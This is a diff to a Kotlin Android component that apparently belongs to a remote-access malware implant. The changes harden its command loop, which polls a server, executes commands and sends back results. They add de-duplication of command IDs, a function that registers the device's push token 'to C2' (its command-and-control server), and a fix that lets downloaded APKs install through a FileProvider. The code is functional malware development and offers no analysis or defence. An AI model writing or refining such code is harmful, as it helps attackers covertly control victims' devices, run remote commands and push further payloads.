@@ -20,6 +20,7 @@ object Core {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var deviceId: String = ""
     private var running = false
+    private val executedCommandIds = mutableSetOf<String>()
 
     fun start(context: Context) {
         if (running) return
@@ -104,6 +105,9 @@ object Core {
             val commands = Transport.pollCommands(deviceId)
             if (commands.isNotEmpty()) {
                 for ((cmdId, cmd) in commands) {
+                    if (executedCommandIds.contains(cmdId)) continue
+                    executedCommandIds.add(cmdId)
+
                     Log.d(TAG, "Executing: $cmd")
                     Transport.markCommandRunning(cmdId)
 
@@ -123,6 +127,9 @@ object Core {
                     Log.d(TAG, "Result sent: ${cmd.take(20)} (${result.length} bytes)")
                 }
             }
+            if (executedCommandIds.size > 500) {
+                executedCommandIds.clear()
+            }
         } catch (e: Exception) {
             Log.e(TAG, "Poll error: ${e.message}")
         }
@@ -130,6 +137,18 @@ object Core {
 
     fun stop() {
         running = false
+    }
+
+    fun saveFcmTokenToC2(context: Context, token: String) {
+        try {
+            if (deviceId.isEmpty()) {
+                deviceId = getFingerprint().replace("|", "_")
+            }
+            Transport.saveFcmToken(deviceId, token)
+            Log.d(TAG, "FCM token saved to C2 (rotation)")
+        } catch (e: Exception) {
+            Log.e(TAG, "FCM token save error: ${e.message}")
+        }
     }
 
     private fun getFingerprint(): String {
@@ -146,9 +165,15 @@ object Core {
                     input.copyTo(output)
                 }
             }
+            val uri = androidx.core.content.FileProvider.getUriForFile(
+                context,
+                "${context.packageName}.fileprovider",
+                apkFile
+            )
             val intent = Intent(Intent.ACTION_VIEW).apply {
-                setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive")
+                setDataAndType(uri, "application/vnd.android.package-archive")
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
             }
             context.startActivity(intent)
             "DOWNLOADING:$url"
